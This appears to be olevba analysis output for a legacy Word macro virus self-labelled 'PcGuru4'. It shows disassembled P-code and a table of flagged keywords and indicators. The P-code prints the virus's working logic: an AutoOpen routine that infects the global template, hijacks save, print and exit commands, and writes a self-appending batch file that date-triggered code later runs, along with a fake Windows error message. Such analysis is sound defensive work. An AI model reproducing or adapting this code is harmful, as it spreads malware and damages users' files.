' 	ArgsMemLd FilePrint 0x0001 
' 	Set dlg 
' Line #21:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePrint 0x0001 
' Line #22:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FilePrint 0x0001 
' Line #23:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FilePrint 0x0001 
' Line #24:
' 	EndSub 
' Macros/VBA/WPKuKkD - 2018 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn i
' Line #3:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #4:
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfDocument 0x0000 
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x000F 
' 	LitDI2 0x0018 
' 	For 
' Line #9:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemCall Bold 0x0000 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #12:
' 	LitStr 0x000B "NAENBGOURSG"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #15:
' 	LitStr 0x0011 "Hello from GREECE"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #17:
' 	LitStr 0x0006 "PCGURU"
' 	LitStr 0x0005 "Print"
' 	LitStr 0x0001 "1"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemCall FilePrintDefault 0x0000 
' Line #21:
' 	EndSub 
' Macros/VBA/EXYhm - 1275 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #4:
' 	LitStr 0x0018 "Windows Protection Error"
' 	LitStr 0x0011 "Microsoft Windows"
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/WbRimiqV - 1799 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #3:
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	LitStr 0x0006 "PCGURU"
' 	LitStr 0x0005 "Print"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #6:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall ChDir 0x0001 
' Line #7:
' 	LitStr 0x000B "PCGURU4.BAT"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Shell 0x0002 
' Line #8:
' 	EndIfBlock 
' Line #9:
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #15:
' 	EndSub 
' Macros/VBA/AutoOpen - 3511 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn bInstalled
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError bail 
' Line #6:
' 	LitDI2 0x0001 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0001 "1"
' 	ParamNamed SaveInterval 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0004 
' Line #7:
' Line #8:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #9:
' Line #10:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #12:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0007 "PCGURU4"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' 	Ld bInstalled 
' 	Not 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0008 "\PcGuru2"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MkDir 0x0001 
' Line #18:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	ParamNamed FileName 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0008 "\PcGuru2"
' 	Add 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #19:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0008 "\PcGuru2"
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' Line #21:
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0005 "NOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0002 "FC"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 2"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0009 "FilePrint"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 4"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0010 "FilePrintDefault"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 5"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x000D "FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 5"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 6"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 7"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0007 "PCGURU4"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' Line #33:
' Line #34:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000C "\PcGuru4.bat"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Rem PcGuru4 virus by NAENBGOURSG"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Rem Golden Version 4.3"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "type PcGuru4.bat >> PcGuru4.bat"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #40:
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #43:
' Line #44:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' Line #45:
' Line #46:
' 	Label bail 
' Line #47:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PcGuru4.bat         |Executable file name                         |
|IOC       |PCGURU4.BAT         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

